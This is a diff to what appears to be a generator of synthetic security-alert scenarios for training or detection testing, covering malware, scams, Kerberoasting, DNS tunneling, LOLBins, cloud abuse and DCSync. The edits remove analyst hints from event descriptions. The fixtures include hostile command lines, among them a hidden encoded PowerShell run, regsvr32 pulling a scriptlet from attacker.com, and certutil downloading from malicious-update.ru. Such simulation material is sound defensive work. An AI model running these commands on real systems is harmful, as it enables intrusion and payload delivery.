@@ -3891,7 +3891,7 @@ export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-exten
       src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
       network: { bytes_out: 3072, bytes_in: 40960, domain: c2Domain },
-      description: "WS-MKT-3301 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago, seconds after the encoded PowerShell command ran — the firewall allowed it since the domain was not yet on any blocklist.",
+      description: "WS-MKT-3301 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "53718",
@@ -3911,7 +3911,7 @@ export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-exten
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1059.001",
       file: { path: "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\\background.js", sha256: stagerHash, size: 18944 },
-      description: "CrowdStrike Falcon identified the sideloaded extension and its encoded PowerShell child process as a known malicious loader (family: ScriptBridge-variant), killed the process and quarantined the extension folder on WS-MKT-3301 — but the beacon to the C2 domain had already completed.",
+      description: "CrowdStrike Falcon killed the encoded PowerShell process and quarantined the sideloaded extension folder on WS-MKT-3301, matching a known loader (family: ScriptBridge-variant).",
       raw: {
         "crowdstrike.event_simplename": "DetectionSummaryEvent",
         "crowdstrike.detection.id": "ldt:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3:4234567892",
@@ -4011,7 +4011,7 @@ export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-202
       hostname: victim.hostname, user_email: victim.email,
       severity: "low",
       file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
-      description: "AnyDesk.exe was downloaded to t.mizrahi's Downloads folder on WS-ACC-4477 — a signed remote-access tool that has no prior install history on this workstation and is not on NexaCorp's approved software list.",
+      description: "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to t.mizrahi's Downloads folder on WS-ACC-4477.",
       raw: {
         "s1.event_type": "FILE_CREATION",
         "s1.threat_level": "none",
@@ -4032,7 +4032,7 @@ export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-202
       source: "edr", vendor: "SentinelOne", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1219",
-      description: "t.mizrahi launched AnyDesk.exe and granted remote-control access to a caller who had reached out claiming to be Microsoft technical support — WS-ACC-4477 has no history of AnyDesk being used in this environment.",
+      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477 and granted remote-control access to an inbound session from an external caller.",
       process: {
         name: "AnyDesk.exe", pid: 5210, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
@@ -4062,7 +4062,7 @@ export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-202
       source: "edr", vendor: "SentinelOne", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email,
       severity: "medium", mitre_technique: "T1059.003",
-      description: "cmd.exe was spawned directly by AnyDesk.exe on WS-ACC-4477 and ran basic system and network enumeration commands — remote-support sessions at NexaCorp normally go through the IT helpdesk ticketing tool, not a personally-installed AnyDesk session.",
+      description: "cmd.exe was spawned directly by AnyDesk.exe on WS-ACC-4477 and ran basic system and network enumeration commands.",
       process: {
         name: "cmd.exe", pid: 5540, parent_name: "AnyDesk.exe", parent_pid: 5210,
         cmdline: "cmd.exe /c systeminfo & netstat -ano",
@@ -4087,7 +4087,7 @@ export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-202
       source: "edr", vendor: "SentinelOne", event_type: "av_quarantine",
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1219",
-      description: "SentinelOne flagged AnyDesk.exe as an unapproved remote-access tool actively controlling a session and spawning shell commands, and terminated the process on WS-ACC-4477 — but the remote session had already been active for several minutes.",
+      description: "SentinelOne terminated AnyDesk.exe on WS-ACC-4477 after flagging it as an unapproved remote-access tool controlling a session and spawning shell commands.",
       raw: {
         "s1.event_type": "PROCESS_CREATION",
         "s1.threat_level": "malicious",
@@ -4183,7 +4183,7 @@ export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-inst
       src_ip: victim.ip, dst_ip: "198.51.100.212", dst_port: 443, protocol: "tcp",
       severity: "low",
       network: { bytes_out: 2048, bytes_in: 18874368, domain: downloadDomain },
-      description: "WS-ENG-2093 downloaded a file named Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top after y.golan clicked a sponsored search result — the download occurred at 20:14, outside normal business hours.",
+      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:14, following a sponsored search result click.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "58122",
@@ -4201,7 +4201,7 @@ export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-inst
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1204.002",
-      description: "y.golan double-clicked Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093. explorer.exe spawned the process directly — the binary is unsigned and had never been seen anywhere in this environment before.",
+      description: "y.golan ran Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 with explorer.exe as the parent process; the binary is unsigned.",
       process: {
         name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "\"C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
@@ -4232,7 +4232,7 @@ export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-inst
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "scheduled_task",
       hostname: victim.hostname, user_email: victim.email,
       severity: "high", mitre_technique: "T1053.005",
-      description: "Office_Pro_2026_Activator_Setup.exe created a scheduled task named OfficeLicenseRefresh on WS-ENG-2093, configured to run an unsigned executable from C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes at any user logon.",
+      description: "Office_Pro_2026_Activator_Setup.exe created a scheduled task named OfficeLicenseRefresh on WS-ENG-2093 that runs C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes.",
       raw: {
         "Timestamp": T(6 * MIN + 40_000),
         "ActionType": "ScheduledTaskCreated",
@@ -4252,7 +4252,7 @@ export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-inst
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1053.005",
       file: { path: "C:\\ProgramData\\OfficeTools\\svchelper.exe", sha256: payloadHash, size: 512000 },
-      description: "Microsoft Defender identified svchelper.exe as a known trojan and quarantined the file, removed the scheduled task, and terminated the installer on WS-ENG-2093 — but the payload had already run for several minutes before being caught.",
+      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 as a known trojan, removed the scheduled task, and terminated the installer.",
       raw: {
         "Timestamp": T(9 * MIN),
         "ActionType": "AntivirusDetection",
@@ -4364,7 +4364,7 @@ export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026")
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1059.001",
-      description: "s.peretz opened Q3_Client_Invoice_Review.docm and enabled content. WINWORD.EXE on WS-SALES-1876 spawned powershell.exe with a hidden window and an encoded command — a Word document never legitimately needs to launch a scripting interpreter.",
+      description: "s.peretz opened Q3_Client_Invoice_Review.docm and enabled content; WINWORD.EXE on WS-SALES-1876 then spawned powershell.exe with a hidden window and an encoded command.",
       process: {
         name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
         cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
@@ -4399,7 +4399,7 @@ export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026")
       src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
       network: { bytes_out: 2560, bytes_in: 32768, domain: c2Domain },
-      description: "WS-SALES-1876 opened a TLS connection to invoice-sync-cdn.xyz, a domain registered 3 days ago — the firewall allowed it since the domain was not yet on any blocklist.",
+      description: "WS-SALES-1876 opened a TLS connection to invoice-sync-cdn.xyz, a domain registered 3 days ago; the firewall allowed the session.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "55931",
@@ -4419,7 +4419,7 @@ export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026")
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1059.001",
       file: { path: "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm", size: 48210 },
-      description: "CrowdStrike Falcon identified the macro payload as a known commodity loader (family: Emotet-variant) and killed the encoded PowerShell process on WS-SALES-1876 — but the process had already reached out to its command server before being caught.",
+      description: "CrowdStrike Falcon killed the encoded PowerShell process on WS-SALES-1876, matching a known commodity loader (family: Emotet-variant).",
       raw: {
         "crowdstrike.event_simplename": "DetectionSummaryEvent",
         "crowdstrike.detection.id": "ldt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:5234567891",
@@ -4517,7 +4517,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
       severity: "informational",
-      description: "m.cohen logged on to WS-DEV-4412 — routine developer workstation login.",
+      description: "m.cohen logged on interactively to developer workstation WS-DEV-4412.",
       raw: {
         "winlog.event_id": "4624",
         "winlog.channel": "Security",
@@ -4555,7 +4555,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "cloud_api_call",
       hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1087.002", mitre_tactic: "TA0007",
-      description: "m.cohen's workstation sent an LDAP query for every account with a servicePrincipalName set, returning 8 results — a PowerView SPN enumeration pattern.",
+      description: "m.cohen's workstation sent an LDAP query for every account with a servicePrincipalName set, returning 8 results.",
       raw: {
         "winlog.event_id": "4662",
         "winlog.channel": "Security",
@@ -4712,7 +4712,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: "srv-db01", src_ip: "10.10.30.44",
       severity: "critical", mitre_technique: "T1078", mitre_tactic: "TA0001",
-      description: "The svc-mssql service account logged on interactively (Type 2) to srv-db01 from WS-DEV-4412, 11 minutes after its RC4 ticket was captured.",
+      description: "The svc-mssql service account logged on interactively (Type 2) to srv-db01 from WS-DEV-4412.",
       raw: {
         "winlog.event_id": "4624",
         "winlog.channel": "Security",
@@ -4772,7 +4772,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       source: "ad", vendor: "Windows Security",
       event_type: "auth_success", severity: "informational",
       hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
-      description: "m.cohen requested 2 Kerberos TGS tickets in the prior 60 minutes, both AES256-encrypted — the account's normal baseline.",
+      description: "m.cohen requested 2 Kerberos TGS tickets in the prior 60 minutes, both AES256-encrypted.",
       raw: {
         "winlog.event_id": "4769",
         "winlog.channel": "Security",
@@ -4823,7 +4823,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
       event_type: "auth_success", severity: "critical",
       hostname: "srv-file01", src_ip: attackerIp,
       mitre_technique: "T1021.002",
-      description: "svc-mssql authenticated to srv-file01 via a network logon (Type 3) — a service account with no business reason to reach the file server.",
+      description: "The svc-mssql service account authenticated to srv-file01 via a network logon (Type 3).",
       raw: {
         "winlog.event_id": "4624",
         "winlog.channel": "Security",
@@ -5037,7 +5037,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1071.004", mitre_tactic: "TA0011",
-      description: `Microsoft Sentinel correlated 847 DNS queries from WS-ENG-3301 to *.${c2Domain} within 60 seconds — this host normally sends about 23 queries per minute.`,
+      description: `Microsoft Sentinel correlated 847 DNS queries from WS-ENG-3301 to *.${c2Domain} within 60 seconds.`,
       raw: {
         "siem.rule_name": "DNSTunneling_VolumeSpike",
         "siem.rule_id": "DNS-TUNNEL-001",
@@ -5089,7 +5089,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1041", mitre_tactic: "TA0010",
-      description: `WS-ENG-3301 sent a DNS query whose base64 subdomain decodes to admin@cryotech.com — credential data leaving over DNS instead of a monitored channel.`,
+      description: `WS-ENG-3301 sent a DNS query whose base64-encoded subdomain decodes to admin@cryotech.com.`,
       dns: { query: `YWRtaW5AY3J5b3RlY2guY29t.data.${c2Domain}`, query_type: "A", response: "NXDOMAIN", rcode: "NOERROR" },
       raw: {
         "event.code": "22",
@@ -5115,7 +5115,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1041", mitre_tactic: "TA0010",
-      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes — an estimated 29 KB exfiltrated.`,
+      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes.`,
       raw: {
         "siem.rule_name": "DNSTunneling_FileChunks",
         "siem.rule_id": "DNS-EXFIL-002",
@@ -5140,7 +5140,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       source: "dns", vendor: "Windows DNS Server",
       event_type: "dns_query", severity: "informational",
       hostname: victimHost, src_ip: victimIp,
-      description: "WS-ENG-3301 sent about 23 DNS queries per minute to developer tool domains (GitHub, npm, VS Code) — its normal baseline.",
+      description: "WS-ENG-3301 sent about 23 DNS queries per minute to developer tool domains (GitHub, npm, VS Code).",
       raw: {
         "event.action": "dns_baseline_aggregate",
         "host.name": victimHost,
@@ -5190,7 +5190,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       event_type: "net_connection", severity: "medium",
       src_ip: victimIp, dst_port: 53,
       hostname: victimHost,
-      description: `The firewall logged DNS traffic (port 53) from WS-ENG-3301 toward ${c2Domain}, a domain registered 3 days ago with no prior traffic from this organization.`,
+      description: `The firewall logged DNS traffic (port 53) from WS-ENG-3301 toward ${c2Domain}, a domain registered 3 days ago.`,
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
@@ -5355,7 +5355,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1204.002", mitre_tactic: "TA0002",
-      description: "WINWORD.EXE spawned a command shell on the HR workstation thirty seconds before the first LOLBin ran.",
+      description: "WINWORD.EXE spawned a command shell on the HR workstation WS-HR-1133.",
       process: {
         name: "cmd.exe", pid: 4420, path: "C:\Windows\System32\cmd.exe",
         parent_name: "WINWORD.EXE", parent_pid: 3308,
@@ -5385,7 +5385,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1105", mitre_tactic: "TA0011",
-      description: "certutil.exe, spawned from cmd.exe after the macro ran, downloaded update.exe from malicious-update.ru — certutil has no legitimate reason to fetch files from the internet.",
+      description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from malicious-update.ru on WS-HR-1133.",
       process: {
         name: "certutil.exe", pid: 4440, path: "C:\\Windows\\System32\\certutil.exe",
         parent_name: "cmd.exe", parent_pid: 4420,
@@ -5428,7 +5428,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "TA0005",
-      description: "regsvr32.exe ran with /i:http://attacker.com/payload.sct — the Squiblydoo technique that executes a remote COM scriptlet and bypasses AppLocker.",
+      description: "regsvr32.exe ran with /i:http://attacker.com/payload.sct, loading a COM scriptlet from a remote URL.",
       process: {
         name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
         parent_name: "cmd.exe", parent_pid: 4420,
@@ -5511,7 +5511,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "high", mitre_technique: "T1059.001", mitre_tactic: "TA0002",
-      description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory. Every LOLBin that follows names this process as its initiator.",
+      description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory.",
       process: {
         name: "powershell.exe", pid: 6200, path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         parent_name: "mshta.exe", parent_pid: 6100,
@@ -5731,7 +5731,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       mitre_technique: "T1105",
       src_ip: victimIp, dst_port: 80,
       hostname: victimHost,
-      description: "The firewall logged certutil.exe on WS-HR-1133 making an outbound HTTP connection to malicious-update.ru (Russia).",
+      description: "WS-HR-1133 opened an outbound HTTP session to malicious-update.ru (91.108.56.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.",
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
@@ -5774,7 +5774,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       mitre_technique: "T1218.010",
       src_ip: victimIp, dst_port: 80,
       hostname: victimHost,
-      description: "The firewall logged regsvr32.exe on WS-HR-1133 fetching payload.sct over HTTP from attacker.com.",
+      description: "WS-HR-1133 fetched http://attacker.com/payload.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
@@ -5917,7 +5917,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       event_type: "threat_intel_match",
       severity: "high", mitre_technique: "T1552.001", mitre_tactic: "TA0006",
       user_email: "a.levy@rocketstack.io",
-      description: "GitHub Advanced Security detected an AWS access key committed to the public repo rocketstack-io/deploy-scripts by a.levy@rocketstack.io and reported it to Amazon Web Services 3 minutes later.",
+      description: "GitHub Advanced Security detected an AWS access key committed to the public repo rocketstack-io/deploy-scripts by a.levy@rocketstack.io.",
       raw: {
         "event.provider": "GitHub Advanced Security",
         "event.action": "secret_scanning_alert_created",
@@ -5949,7 +5949,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       severity: "high", mitre_technique: "T1078.004", mitre_tactic: "TA0001",
       src_ip: attackerIp,
       user_email: "a.levy@rocketstack.io",
-      description: `GetCallerIdentity was called using the leaked key from Singapore (${attackerIp}) 2 minutes after the GitHub commit — the first-ever use of this key from this IP.`,
+      description: `GetCallerIdentity was called using the leaked access key from Singapore (${attackerIp}).`,
       raw: {
         "aws.cloudtrail.event_name": "GetCallerIdentity",
         "aws.cloudtrail.event_source": "sts.amazonaws.com",
@@ -5987,7 +5987,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       severity: "medium", mitre_technique: "T1580", mitre_tactic: "TA0007",
       src_ip: attackerIp,
       user_email: "a.levy@rocketstack.io",
-      description: "The leaked key called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds — finding 12 S3 buckets, EC2 instances in 3 regions, and 9 Secrets Manager entries.",
+      description: "The leaked key called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, returning 12 S3 buckets and 9 Secrets Manager entries.",
       raw: {
         "aws.cloudtrail.event_name": "ListBuckets|DescribeInstances|ListSecrets|DescribeVpcs",
         "aws.cloudtrail.event_source": "s3.amazonaws.com|ec2.amazonaws.com|secretsmanager.amazonaws.com",
@@ -6066,7 +6066,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       severity: "critical", mitre_technique: "T1578.002", mitre_tactic: "TA0005",
       src_ip: attackerIp,
       user_email: "a.levy@rocketstack.io",
-      description: "The same key called RunInstances in eu-west-1, launching 6 more p3.8xlarge instances — 14 GPU instances now running across two regions.",
+      description: "The same key called RunInstances in eu-west-1, launching 6 more p3.8xlarge GPU instances.",
       raw: {
         "aws.cloudtrail.event_name": "RunInstances",
         "aws.cloudtrail.event_source": "ec2.amazonaws.com",
@@ -6309,7 +6309,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       event_type: "cloud_storage_access",
       severity: "critical", mitre_technique: "T1530", mitre_tactic: "TA0009",
       src_ip: attackerIp,
-      description: `S3 access logs show 12,847 objects (4.7GB) downloaded from rocketstack-prod-customer-data by an anonymous requester at ${attackerIp} via the newly public bucket policy.`,
+      description: `S3 access logs show 12,847 objects (4.7GB) downloaded from rocketstack-prod-customer-data by an anonymous requester at ${attackerIp}.`,
       network: { bytes_out: 4_718_592_000, bytes_in: 0 },
       raw: {
         "aws.cloudtrail.event_name": "GetObject",
@@ -6475,7 +6475,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: dc01, user_email: adminEmail, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1021.001",
-      description: `The it.admin account RDP'd (RemoteInteractive) directly into ${dc01} from ${attackerIp} in Amsterdam, Netherlands, at 01:15 — the first time this account has authenticated from that country.`,
+      description: `The it.admin account logged on to ${dc01} with a RemoteInteractive (RDP) logon from ${attackerIp} in Amsterdam, Netherlands, at 01:15.`,
       raw: {
         "winlog.event_id": "4624",
         "winlog.channel": "Security",
@@ -6525,7 +6525,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       hostname: dc01, user_email: adminEmail,
       severity: "critical", mitre_technique: "T1003.001",
       file: { path: "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe", sha256: mimikatzHash, size: 1245184 },
-      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe on ${dc01}, three minutes after the RDP logon — but took no action.`,
+      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe on ${dc01} and took no action.`,
       raw: {
         "event.provider": "Microsoft Defender Antivirus",
         "event.code": "1116",
@@ -6564,7 +6564,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
       hostname: dc01, user_email: adminEmail,
       severity: "critical", mitre_technique: "T1562.001",
-      description: `reg.exe set DisableRealtimeMonitoring=1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender on ${dc01}, two minutes after Mimikatz was flagged.`,
+      description: `reg.exe set DisableRealtimeMonitoring=1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender on ${dc01}.`,
       raw: {
         "event.provider": "Microsoft Defender Antivirus",
         "event.code": "5001",
@@ -6603,7 +6603,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
       hostname: dc01, user_email: adminEmail,
       severity: "critical", mitre_technique: "T1003.006",
-      description: "it.admin, a non-DC user account, exercised DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights against CN=NEXACORP,DC=nexacorp,DC=com — rights normally reserved for domain controller machine accounts.",
+      description: "it.admin, a user account, exercised DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights against CN=NEXACORP,DC=nexacorp,DC=com.",
       raw: {
         "winlog.event_id": "4662",
         "winlog.channel": "Security",
@@ -6698,7 +6698,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
       hostname: dc02, user_email: adminEmail,
       severity: "high", mitre_technique: "T1558.001",
-      description: `A service ticket for cifs/${dc02} was requested for it.admin from ${attackerIp}, encrypted with RC4 (0x17). The domain has been AES-only since the 2024 hardening project.`,
+      description: `A service ticket for cifs/${dc02} was requested for it.admin from ${attackerIp}, encrypted with RC4 (0x17).`,
       raw: {
         "winlog.event_id": "4769",
         "winlog.channel": "Security",
@@ -6736,7 +6736,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "siem", vendor: "Microsoft Sentinel", event_type: "threat_intel_match",
       hostname: dc01, user_email: adminEmail,
       severity: "high",
-      description: "A hunting query for Kerberos authentication events (4768) for it.admin across all domain controllers, covering the 24 hours before the service ticket request, returned zero rows. The account's last recorded 4768 was six days earlier.",
+      description: "A hunting query for Kerberos 4768 events for it.admin across all domain controllers over the prior 24 hours returned zero rows.",
       raw: {
         "sentinel.query.name": "Kerberos TGS without preceding TGT",
         "sentinel.query.window_hours": "24",
@@ -6755,7 +6755,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: dc02, user_email: adminEmail, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1550.003",
-      description: `it.admin authenticated to ${dc02} via a network logon (Type 3) using the forged ticket, directly from ${attackerIp} — no internal workstation in the path.`,
+      description: `it.admin authenticated to ${dc02} via a network logon (Type 3) directly from ${attackerIp}.`,
       raw: {
         "winlog.event_id": "4624",
         "winlog.channel": "Security",
@@ -6913,7 +6913,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
       hostname: dc01, user_email: adminEmail,
       severity: "critical", mitre_technique: "T1070.001",
-      description: `it.admin cleared the Security event log on ${dc01} (Event 1102), two minutes after creating the svc-monitoring-prod account.`,
+      description: `it.admin cleared the Security event log on ${dc01} (Event 1102).`,
       raw: {
         "winlog.event_id": "1102",
         "winlog.channel": "Security",
@@ -7117,7 +7117,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
       event_type: "process_create",
       hostname: victim.hostname,
       severity: "high", mitre_technique: "T1195.002",
-      description: "CrowdStrike detected netpulse-agent spawning netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ instead of the expected /usr/lib/netpulse/, with a SHA256 hash that does not match NetPulse's published binary.",
+      description: "CrowdStrike detected netpulse-agent spawning netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01.",
       process: { name: "netpulse-telemetry-svc", pid: 14882,
         path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
         parent_name: "netpulse-agent", parent_pid: 14700,
@@ -7155,7 +7155,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
       src_ip: "10.0.1.10", dst_ip: attacker.ip,
       dst_port: 443, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
-      description: `prod-srv-01 began sending HTTPS beacons every 45 seconds to ${attacker.c2Domain} (${attacker.ip}, Netherlands) using a self-signed certificate registered 3 days ago — NetPulse's real telemetry endpoint is telemetry.netpulse.io.`,
+      description: `prod-srv-01 sent HTTPS traffic every 45 seconds to ${attacker.c2Domain} (${attacker.ip}, Netherlands) over a self-signed certificate, on a domain registered 3 days ago.`,
       network: { domain: attacker.c2Domain, bytes_in: 4096, bytes_out: 1024 },
       raw: {
         "data.type": "traffic",
@@ -7256,7 +7256,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
       event_type: "cloud_api_call",
       src_ip: attacker.relayIp,
       severity: "critical", mitre_technique: "T1078.004",
-      description: `The devops-ci IAM user called AssumeRole for rocketstack-prod-deploy from ${attacker.relayIp} in Singapore — a different IP than the Netherlands C2, and the first-ever use of this role from this IP.`,
+      description: `The devops-ci IAM user called AssumeRole for rocketstack-prod-deploy from ${attacker.relayIp} in Singapore.`,
       cloud: { provider: "aws", service: "sts", api_call: "AssumeRole", region: "eu-west-1" },
       raw: {
         "aws.cloudtrail.event_name": "AssumeRole",
@@ -7331,7 +7331,7 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
       src_ip: "10.0.1.10", dst_ip: "10.0.1.15",
       dst_port: 22, protocol: "tcp",
